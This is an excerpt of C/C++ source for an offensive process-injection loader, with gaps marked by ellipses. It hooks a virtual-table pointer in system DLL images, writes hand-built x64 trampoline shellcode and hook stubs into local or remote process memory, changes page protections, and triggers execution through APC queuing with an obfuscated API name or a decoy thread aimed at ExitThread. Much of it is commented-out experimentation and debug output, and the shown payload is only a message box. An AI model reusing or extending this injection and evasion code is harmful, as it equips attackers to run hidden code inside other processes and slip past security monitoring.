 ...
 * A suboptimal way to execute hooked_function via VMT hooking Ptr.
 * By inject trampoline code inside of loaded module image and redirect the VMT Ptr to this trampoline. 
 * It is suboptimal compares to loader 65 where using a hook stub inline assembly... Or .asm file.
 * The injected code will be the new 'modified code'... 
 ...
 * Remote inejction version of loader-37
 * TODO: implement PEM module loading for remote process. 
 * TODO: add PAGE_NOACCESS inside Sifu memory guard 
...
// define BYTE trampCodeBuff[13]:
// BYTE trampCodeBuff[32] = {
//     0x48, 0xB9,                   // MOV RCX, imm64 (move original return address into RCX)
//     0x00, 0x00, 0x00, 0x00,       // Placeholder for the lower 32 bits of the original return address
//     0x00, 0x00, 0x00, 0x00,       // Placeholder for the upper 32 bits of the original return address
//     0x48, 0x83, 0xEC, 0x28,       // SUB RSP, 0x28 (allocate shadow space on the stack)
//     0x48, 0xB8,                   // MOV RAX, imm64 (move the address of hooked_function into RAX)
//     0x00, 0x00, 0x00, 0x00,       // Placeholder for the lower 32 bits of the hooked_function address
//     0x00, 0x00, 0x00, 0x00,       // Placeholder for the upper 32 bits of the hooked_function address
//     0xFF, 0xD0,                   // CALL RAX (call hooked_function)
// };
...
//     0x00, 0x00, 0x00, 0x00,       // Placeholder for the upper 32 bits of the original return address
//     0x48, 0x83, 0xEC, 0x28,       // SUB RSP, 0x28 (allocate shadow space on the stack)
//     0x49, 0xBB,                   // MOV R11, imm64 (move the address of hooked_function into R11)
//     0x00, 0x00, 0x00, 0x00,       // Placeholder for the lower 32 bits of the hooked_function address
//     0x00, 0x00, 0x00, 0x00,       // Placeholder for the upper 32 bits of the hooked_function address
//     0x41, 0xFF, 0xD3,             // CALL R11 (call hooked_function)
//     0x48, 0x83, 0xC4, 0x28,       // ADD RSP, 0x28 (restore stack)
//     0xFF, 0xE1                    // JMP RCX (jump back to original return address)
// };


// BYTE trampCodeBuff[13] = { 
//     0x48, 0xBB,                   // MOV RBX, imm64
//     0x00, 0x00, 0x00, 0x00,       // Lower 32 bits of the address
//     0x00, 0x00, 0x00, 0x00,       // Upper 32 bits of the address
//     0x53,                         // PUSH RBX
//     0xC3                          // RET
// };
// BYTE trampCodeBuff[13] = { 
...
// BYTE trampCodeBuff[10] = {
//     0x48, 0x8D, 0x05,             // LEA RAX, [RIP+0]
//     0x00, 0x00, 0x00, 0x00,       // Offset (will be calculated later)
//     0xFF, 0xE0                    // JMP RAX
// };

// relative jump
// BYTE trampCodeBuff[5] = {
//     0xE9,                         // JMP rel32
//     0x00, 0x00, 0x00, 0x00        // Relative offset (to be calculated)
// };

// far jump
// BYTE trampCodeBuff[12] = {
//     0xEA,                         // JMP FAR
//     0x00, 0x00,                   // Offset (low)
//     0x00, 0x00,                   // Offset (high)
//     0x00, 0x00,                   // Segment
//     0x00, 0x00                    // Additional bytes (if needed)
// };

// BYTE trampCodeBuff[22] = {
//     0x48, 0x83, 0xEC, 0x28,       // SUB RSP, 0x28  (adjust stack for shadow space)
//     0x48, 0xB8,                   // MOV RAX, imm64 (load the target address into RAX)
//     0x00, 0x00, 0x00, 0x00,       // Lower 32 bits of the address
//     0x00, 0x00, 0x00, 0x00,       // Upper 32 bits of the address
//     0xFF, 0xD0,                   // CALL RAX
//     0x48, 0x83, 0xC4, 0x28,       // ADD RSP, 0x28  (restore stack)
...
BYTE trampCodeBuff[22] = {
    0x48, 0x83, 0xEC, 0x28,       // SUB RSP, 0x28  (adjust stack for shadow space)
    0x49, 0xBB,                   // MOV R11, imm64 (load the target address into R11)
    0x00, 0x00, 0x00, 0x00,       // Lower 32 bits of the address
    0x00, 0x00, 0x00, 0x00,       // Upper 32 bits of the address
...
extern "C" void HookStub_start();  // Declare function start
extern "C" void HookStub_end();    // Declare function end
...
__asm__ volatile (
    ...
    "movq %[orig_addr], %%rcx \n"     // Load the original return address into RCX
    "subq $0x28, %%rsp \n"            // Allocate shadow space on the stack
    "callq *%[call_addr] \n"          // Call the address you want
    "addq $0x28, %%rsp \n"            // Restore the stack
    "jmpq *%%rcx \n"                  // Jump back to the original return address
    "HookStub_end:\n"                 // Function end label
    :
    : [call_addr] "r" (DllEntryGlobal),  // Replace the hooked function with the call address
      [orig_addr] "m" (dwGlobal_OrigReferenceAddr)
    : "rcx"
);
...
// define NtFlushVirtualMemory: 
typedef NTSTATUS (__stdcall* NtFlushVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
...
NtFlushVirtualMemory_t NtFlushVirtualMemory;
...
DWORD InstallHook()
{
    ...
    pHookAddr = pModuleBase + VMT_PTR; //in ntdll.dll
...
// Instruction 0x00007ff950e443b0 referenced at USER32.dll!0x00007ff951816240 (sect: .data, virt_addr: 0xB6240, stack delta: 0x8F0)
    ...
    printf("[+] *(DWORD_PTR*)pHookAddr is: %p\n", *(DWORD_PTR*)pHookAddr);
    ...
    // print the address of hooked_function:
    // printf("[+] hooked_function is at: %p\n", hooked_function);
    //print opCodeAddress:
    printf("[+] opCodeAddress is at: %p\n", opCodeAddress);

    // *(DWORD_PTR*)pHookAddr = (DWORD_PTR)&hooked_function;
    DWORD_PTR hooked_function_addr = (DWORD_PTR)opCodeAddress;
    ...
    // *(DWORD_PTR*)pHookAddr = (DWORD_PTR)HookStub; //TOTEST:
    // *(DWORD_PTR*)pHookAddr = (DWORD_PTR)hooked_function; //TOTEST:
...
// Instruction 0x00007ff950e443b0 referenced at USER32.dll!0x00007ff951816240 (sect: .data, virt_addr: 0xB6240, stack delta: 0x8F0)
    ...
    //print LPVOID opCodeAddress:
    // DWORD_PTR hooked_function_addr = (DWORD_PTR)opCodeAddress;
    DWORD_PTR hooked_function_addr = (DWORD_PTR)DllEntryGlobal;
    ...
    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, (LPVOID)opCodeAddress, sizeof(trampCodeBuff), PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] Failed to change memory protection for opCodeAddress. Error: %lu\n", GetLastError());
        return -1;
    }
    ...
    if (bytesWritten != sizeof(DWORD_PTR)) {
        ...
        printf("[+] *(DWORD_PTR*)pHookAddr after change: %p \r\n", *(DWORD_PTR*)pHookAddr);
        //print pHookAddr: 
        printf("[+] pHookAddr after change is at: %p\n", pHookAddr);
...
int main(int argc, char *argv[])
{
    ...
    DLLEntry DllEntryLocal = (DLLEntry)(dllEntryPoint);
    // (*DllEntryLocal)((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, 0);
    DllEntryGlobal = DllEntryLocal;
    ...
    /// print HookStub address: 
    printf("[+] HookStub_start: %p\n", HookStub_start);
    // print (LPVOID)HookStub:
    printf("[+] HookStub: %p\n", (LPVOID)HookStub); 
    ...
    if(bRemoteInjection) {
        ...
        // // Now calculate the opcode address
        // // opCodeAddress = (PVOID)((DWORD64)dllEntryPoint + magiccodeSize + 8);
        // // trampCodeBuff[21] = {
        // //     0x48, 0xB9,                   // MOV RCX, imm64 (move original return address into RCX)
        // //     0x00, 0x00, 0x00, 0x00,       // Placeholder for the lower 32 bits of the original return address
        // //     0x00, 0x00, 0x00, 0x00,       // Placeholder for the upper 32 bits of the original return address
        ...
        // //     0x00, 0x00, 0x00, 0x00,       // Placeholder for the upper 32 bits of the hooked_function address
        // //     0xFF, 0xD0,                   // CALL RAX (call hooked_function)
        // //     0x48, 0x83, 0xC4, 0x28,       // ADD RSP, 0x28 (deallocate shadow space on the stack)
        // //     0xFF, 0xE1                    // JMP RCX (jump back to original return address)
        // // };
        // // memcpy(trampCodeBuff + 2, &DllEntryGlobal, 8);
        // // print the values of trampCodeBuff:
        // // printf("[+] trampCodeBuff: ");
        // // for (int i = 0; i < 13; i++) {
        // //     printf("%02x", trampCodeBuff[i]);
        // // }
        // // printf("\n");
        // // Size of the HookStub function
        // SIZE_T hookStubSize = 34;

        // printf("[+] HookStub size: %lu\n", hookStubSize);

        // SIZE_T writeResult = 0;

        // printf("[+] opCodeAddress: %p\n", opCodeAddress);
        // printf("[+] press any key to continue continuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinuecontinue\n");
        // getchar();


        // opCodeAddress = VirtualAllocEx(hProcess, NULL, hookStubSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        // // Write the function to the remote process at opCodeAddress
        // if (!WriteProcessMemory(hProcess, opCodeAddress, (PVOID)HookStubRemote, hookStubSize, &writeResult)) {
        //     printf("[-] Failed to write HookStub to the remote process\n");
        //     return -1;
        // } else {
        //     printf("[+] HookStub written to the remote process\n");
        // }
        ...
        // if(writeResult) {
        //     printf("[+] Opcode buffer successfully written to the remote process.\n");
        // } else {
        //     printf("[-] Failed to write opcode buffer to the remote process. Error: %lu\n", GetLastError());
        // }
        ...
        /// print DllEntryGlobal:
        printf("[+] DllEntryGlobal: %p\n", DllEntryGlobal);
        // print the address of DllEntryGlobal:
        printf("[+] &DllEntryGlobal: %p\n", &DllEntryGlobal);
        //print dllentrypoint: 
        printf("[+] dllEntryPoint: %p\n", dllEntryPoint);
        // uintptr_t functionAddress = (uintptr_t)DllEntryGlobal;
        getchar();
        ...
        memcpy(&trampCodeBuff[6], &functionAddress, sizeof(functionAddress));
        ...
        // // Now calculate the opcode address
        // opCodeAddress = (LPVOID)((DWORD64)DllEntryGlobal + magiccodeSize + 8);
        // // trampCodeBuff[21] = {
        // //     0x48, 0xB9,                   // MOV RCX, imm64 (move original return address into RCX)
        // //     0x00, 0x00, 0x00, 0x00,       // Placeholder for the lower 32 bits of the original return address
        // //     0x00, 0x00, 0x00, 0x00,       // Placeholder for the upper 32 bits of the original return address
        ...
        // #1: Align the address to the next page boundary: 
        // This is to ensure that the memory protection can be applied to the correct opcode...
        // Calculate the initial address where you want to write the trampCodeBuff
        ...
        uintptr_t functionAddress; 
        if(bUseNoAccess) {
            // uintptr_t functionAddress = (uintptr_t)HookStub;
            /// HookStub? This is a bit of a overkill. 
            functionAddress = (uintptr_t)hooked_function;
        } else {
            functionAddress = (uintptr_t)DllEntryGlobal;
        ...
        /// print the content of opCodeAddress after writing the buffer:
        ...
        // uintptr_t functionAddress = (uintptr_t)hooked_function;
        // memcpy(trampCodeBuff + 2, &dwGlobal_OrigReferenceAddr, 8);
        // // add dwGlobal_OrigReferenceAddr to the buffer: after functionAddress:
        // memcpy(trampCodeBuff + 16, &functionAddress, 8);
        ...
        // /// allocate memory for trampCodeBuff:
        // // LPVOID opCodeAddress = VirtualAlloc(NULL, sizeof(trampCodeBuff), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        // BOOL writeResult = WriteProcessMemory(
        //     hProcess,                      // Handle to the remote process
        //     opCodeAddress,                 // Target address (DllEntryGlobal + regionSize)
        //     trampCodeBuff,                  // The opcode buffer we want to write
        //     sizeof(trampCodeBuff),          // Size of the opcode buffer
        //     NULL                           // Optionally retrieve the number of bytes written
        // );
    ...
    /// strange trampoline code: 


    // call FlushInstructionCache:
    // FlushInstructionCache(GetCurrentProcess(), dllEntryPoint, magiccodeSize);
    // get func pointer of NtFlushVirtualMemory:
    // NtFlushVirtualMemory_t NtFlushVirtualMemory = (NtFlushVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushVirtualMemory");
    // // After modifying the shared memory in the local process, flush the changes
    // if (!FlushViewOfFile(fileBase, viewSize)) {
    //     printf("FlushViewOfFile failed. Error: %x\n", GetLastError());
    // }



// status = ZwFlushVirtualMemory(GetCurrentProcess(), &fileBase, &viewSize, NULL);
// if (status != STATUS_SUCCESS) {
//     printf("ZwFlushVirtualMemory failed with status: %x\n", status);
// }
    ...
    // DLLEntry DllEntryLocal = (DLLEntry)((unsigned long long int)fileBase + entryPointRVA1);
    // // (*DllEntryLocal)((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, 0);
    ...
    if(bRemoteInjection) {
        ...
        // // // call RtlDispatchAPC to execute DllEntryLocal:
        ...
        // // if(result != STATUS_SUCCESS) {
        // //     printf("[-] RtlDispatchAPC failed to execute DllEntryLocal. Status: %x\n", result);
        // //     return 1;
        // // } else {
        // //     printf("[+] DllEntryLocal executed successfully.\n");
        // // }
        // // //pass RtlDispatchAPC_t to pNtQueueApcThread to call DllEntryLocal:
        // const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };
        // NtQueueApcThreadEx2_t pNtQueueApcThread = (NtQueueApcThreadEx2_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcEx2Str);
        ...
        // ); 
        // if(result != STATUS_SUCCESS) {
        //     printf("[-] NtQueueApcThreadEx2 failed to execute DllEntryLocal. Status: %x\n", result);
        //     return 1;
        // } else {
        ...
        DWORD threadId = 0;
        if(useNotepad) {
        // User can manully trigger the execution by doing something with the target process,
        // not necessarily create a thread to call ExitThread.
            ...
            if (hThread == NULL) {
                ...
                printf("[+] Thread created with decoy address pointed to ExitThread function \n");
            } 

            // Optionally, wait for the remote thread to finish execution
            WaitForSingleObject(hThread, INFINITE);
        } else {
            printf("[+] No thread creation. \n");
            printf("[+] Perform some operaitons with the target app process to trigger execution.\n");
        }
    } else {
...
ULONG WINAPI hooked_function(DWORD LdrReserved, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter) {
    ...
    MessageBoxA(NULL, message, "VT Ptr called this", MB_OK);

    // Optionally, you could invoke the actual thread function if needed
    if (lpStartAddress) {
    ...
    if(bUseNoAccess) {
        ...
        *(DWORD_PTR*)pHookAddr = dwGlobal_OrigReferenceAddr; 
